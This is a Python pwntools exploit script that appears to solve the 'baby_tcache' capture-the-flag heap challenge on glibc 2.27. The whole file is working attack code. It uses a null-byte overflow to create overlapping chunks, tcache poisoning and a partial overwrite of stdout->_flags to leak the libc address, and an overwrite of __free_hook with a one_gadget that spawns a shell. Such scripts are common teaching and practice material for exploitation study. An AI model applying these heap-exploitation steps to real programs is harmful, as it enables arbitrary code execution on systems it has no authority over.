from pwn import *

p = process('./baby_tcache', env={"LD_PRELOAD":"libc-2.27.so"}, aslr=False)
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(proc.pidof(p)[0], gdbscript='''
                                    continue
                                    ''')

elf = ELF('baby_tcache')
libc = ELF('libc-2.27.so')

def new(size, data):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    p.sendafter('Data:', data)


def delete(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))

def solve():
    onegadget = [0x4f322, 0x4f2c5, 0x10a38c]
    new(0x4f0, 'A'*400)         # chunk 0 size 0x500
    new(0x60, 'B'*50)          # chunk 1 size 0x70
    new(0x30, 'C'*20)          # chunk 2 size 0x40
    new(0x10, 'D'*0xe)          # chunk 3 size 0x20
    new(0x4f0, 'E'*400)         # chunk 4 size 0x500
    new(0x10, 'F'*0x8)          # chunk 5 size 0x20 (prevent unsorted bin chunk merge to top chunk)

    delete(3)

    new(0x18, p64(0)*2 + p64(0x500 + 0x70 + 0x40 + 0x20))   # null byte overflow chunk 4 + prev_size
    delete(0)               # free chunk 0 to unsorted bin

    delete(4)               # free chunk 4 to consolidation

    delete(1)
    delete(3)               # save chunk 3 for later tcache poisoning
    new(0x4f0, 'A')                 # chunk 0
    new(0x90, '\x60\x77')        # partial overwrite the fd of chunk 1 in bin, now it points to stdout->_flags , chunk 1

    new(0x60, 'w')              # chunk 2

    new(0x60, p64(0xfbad3c80) + p64(0x00)*3 + "\x00")   # chunk 3, partial overwrite to stdout->_flags
    libc.address = u64(p.recvuntil("$$")[8:16]) - 0x3ed8b0
    free_hook = libc.symbols['__free_hook']
    one_gadget = libc.address + onegadget[0]
    system = libc.symbols['system']
    log.info("leak libc: %s"%hex(libc.address))
    log.info("free hook: %s"%hex(free_hook))
    log.info("one gadget: %s"%hex(one_gadget))
    log.info("system %s"%hex(system))

    new(0x400, p64(0)*2 + p64(free_hook))   # chunk 4, now chunk 4 will overlap with a bin in tcache[0] (old chunk 3) => add free_hook to tcache[0]

    new(0x10, 'a')                # chunk 5

    new(0x10, p64(one_gadget))              # chunk 6, overwirte free_Hook with one_gadget
    delete(0)               # trigger one_gadget
    p.interactive()
    
if __name__ == '__main__':
    solve()